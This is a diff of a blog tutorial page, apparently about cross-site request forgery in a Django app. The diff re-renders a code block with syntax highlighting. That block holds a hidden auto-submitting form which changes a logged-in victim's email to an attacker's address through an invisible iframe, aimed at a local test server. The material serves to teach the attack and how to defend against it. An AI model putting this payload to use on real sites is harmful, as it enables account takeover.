@@ -219,26 +219,23 @@ csrfmiddlewaretoken=as2NnTUPLCqyrj5SNjk6M0rGSWo5Cuw1FyNqbJayFkAHwBF5FRk4xpeTo9y2
 <h3 id="wouldn-t-it-be-neat-if-we-could-make-the-victim-s-browser-send-the-request-for-us-as-if-the-victim-has-submitted-the-change-email-form">Wouldn&rsquo;t it be neat if we could make the victim&rsquo;s browser send the request for us as if the victim has submitted the change email form?</h3>
 
 <p>Well guess what - <strong>we can!</strong> This is exactly what the hidden post form does in the malicious site. Let&rsquo;s have a second look at it to understand how exactly it tricks our browser to send the <em>sessionid</em> cookie.</p>
-
-<pre><code class="language-html">&lt;form id=&quot;form&quot; method=&quot;post&quot; action=&quot;http://127.0.0.10:8000/accounts/change/email/&quot; target=&quot;my_iframe&quot; style=&quot;display:none&quot;&gt;
-    &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=&quot;mz4LR3Umv8hpB2Go4VLNmkRslgLIwdgc1zr7m7YYhiys8cGES7xZSOQVD0534fgt&quot;&gt;
-    &lt;div class=&quot;alert alert-danger alert-dismissable alert-link&quot; role=&quot;alert&quot;&gt;
-        &lt;button class=&quot;close&quot; type=&quot;button&quot; data-dismiss=&quot;alert&quot; aria-label=&quot;close&quot;&gt;&amp;#215;&lt;/button&gt;
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#6ab825;font-weight:bold">form</span> <span style="color:#bbb">id</span>=<span style="color:#ed9d13">&#34;form&#34;</span> <span style="color:#bbb">method</span>=<span style="color:#ed9d13">&#34;post&#34;</span> <span style="color:#bbb">action</span>=<span style="color:#ed9d13">&#34;http://127.0.0.10:8000/accounts/change/email/&#34;</span> <span style="color:#bbb">target</span>=<span style="color:#ed9d13">&#34;my_iframe&#34;</span> <span style="color:#bbb">style</span>=<span style="color:#ed9d13">&#34;display:none&#34;</span>&gt;
+    &lt;<span style="color:#6ab825;font-weight:bold">input</span> <span style="color:#bbb">type</span>=<span style="color:#ed9d13">&#34;hidden&#34;</span> <span style="color:#bbb">name</span>=<span style="color:#ed9d13">&#34;csrfmiddlewaretoken&#34;</span> <span style="color:#bbb">value</span>=<span style="color:#ed9d13">&#34;mz4LR3Umv8hpB2Go4VLNmkRslgLIwdgc1zr7m7YYhiys8cGES7xZSOQVD0534fgt&#34;</span>&gt;
+    &lt;<span style="color:#6ab825;font-weight:bold">div</span> <span style="color:#bbb">class</span>=<span style="color:#ed9d13">&#34;alert alert-danger alert-dismissable alert-link&#34;</span> <span style="color:#bbb">role</span>=<span style="color:#ed9d13">&#34;alert&#34;</span>&gt;
+        &lt;<span style="color:#6ab825;font-weight:bold">button</span> <span style="color:#bbb">class</span>=<span style="color:#ed9d13">&#34;close&#34;</span> <span style="color:#bbb">type</span>=<span style="color:#ed9d13">&#34;button&#34;</span> <span style="color:#bbb">data-dismiss</span>=<span style="color:#ed9d13">&#34;alert&#34;</span> <span style="color:#bbb">aria-label</span>=<span style="color:#ed9d13">&#34;close&#34;</span>&gt;&amp;#215;&lt;/<span style="color:#6ab825;font-weight:bold">button</span>&gt;
         Please enter another email.
-    &lt;/div&gt;
-    &lt;div class=&quot;form-group is-invalid&quot;&gt;
-        &lt;label for=&quot;id_email&quot;&gt;Email&lt;/label&gt;
-        &lt;input type=&quot;email&quot; name=&quot;email&quot; value=&quot;attacker@attacker.com&quot;
-                    class=&quot;form-control is-invalid&quot; placeholder=&quot;Email&quot; title=&quot;&quot; required id=&quot;id_email&quot;&gt;
-     &lt;div class=&quot;invalid-feedback&quot;&gt;Please enter another
+    &lt;/<span style="color:#6ab825;font-weight:bold">div</span>&gt;
+    &lt;<span style="color:#6ab825;font-weight:bold">div</span> <span style="color:#bbb">class</span>=<span style="color:#ed9d13">&#34;form-group is-invalid&#34;</span>&gt;
+        &lt;<span style="color:#6ab825;font-weight:bold">label</span> <span style="color:#bbb">for</span>=<span style="color:#ed9d13">&#34;id_email&#34;</span>&gt;Email&lt;/<span style="color:#6ab825;font-weight:bold">label</span>&gt;
+        &lt;<span style="color:#6ab825;font-weight:bold">input</span> <span style="color:#bbb">type</span>=<span style="color:#ed9d13">&#34;email&#34;</span> <span style="color:#bbb">name</span>=<span style="color:#ed9d13">&#34;email&#34;</span> <span style="color:#bbb">value</span>=<span style="color:#ed9d13">&#34;attacker@attacker.com&#34;</span>
+                    <span style="color:#bbb">class</span>=<span style="color:#ed9d13">&#34;form-control is-invalid&#34;</span> <span style="color:#bbb">placeholder</span>=<span style="color:#ed9d13">&#34;Email&#34;</span> <span style="color:#bbb">title</span>=<span style="color:#ed9d13">&#34;&#34;</span> <span style="color:#bbb">required</span> <span style="color:#bbb">id</span>=<span style="color:#ed9d13">&#34;id_email&#34;</span>&gt;
+     &lt;<span style="color:#6ab825;font-weight:bold">div</span> <span style="color:#bbb">class</span>=<span style="color:#ed9d13">&#34;invalid-feedback&#34;</span>&gt;Please enter another
          email.
-     &lt;/div&gt;
-    &lt;/div&gt;
-    &lt;input type=&quot;submit&quot; class=&quot;btn btn-success&quot;&gt;Change&lt;/button&gt;
-&lt;/form&gt;
-&lt;iframe style=&quot;display:none&quot; width=&quot;0&quot; height=&quot;0&quot; border=&quot;0&quot; name=&quot;my_iframe&quot; id=&quot;my_iframe&quot;&gt;&lt;/iframe&gt;
-</code></pre>
-
+     &lt;/<span style="color:#6ab825;font-weight:bold">div</span>&gt;
+    &lt;/<span style="color:#6ab825;font-weight:bold">div</span>&gt;
+    &lt;<span style="color:#6ab825;font-weight:bold">input</span> <span style="color:#bbb">type</span>=<span style="color:#ed9d13">&#34;submit&#34;</span> <span style="color:#bbb">class</span>=<span style="color:#ed9d13">&#34;btn btn-success&#34;</span>&gt;Change&lt;/<span style="color:#6ab825;font-weight:bold">button</span>&gt;
+&lt;/<span style="color:#6ab825;font-weight:bold">form</span>&gt;
+&lt;<span style="color:#6ab825;font-weight:bold">iframe</span> <span style="color:#bbb">style</span>=<span style="color:#ed9d13">&#34;display:none&#34;</span> <span style="color:#bbb">width</span>=<span style="color:#ed9d13">&#34;0&#34;</span> <span style="color:#bbb">height</span>=<span style="color:#ed9d13">&#34;0&#34;</span> <span style="color:#bbb">border</span>=<span style="color:#ed9d13">&#34;0&#34;</span> <span style="color:#bbb">name</span>=<span style="color:#ed9d13">&#34;my_iframe&#34;</span> <span style="color:#bbb">id</span>=<span style="color:#ed9d13">&#34;my_iframe&#34;</span>&gt;&lt;/<span style="color:#6ab825;font-weight:bold">iframe</span>&gt;</code></pre></div>
 <p>This form is a copy of the legitimate form from our Django app, with the only difference that the <strong>fields have set values</strong>.
 (The csrfmiddlewaretoken field&rsquo;s value is randomly set. It can even be omitted and it won&rsquo;t make a difference)</p>
 
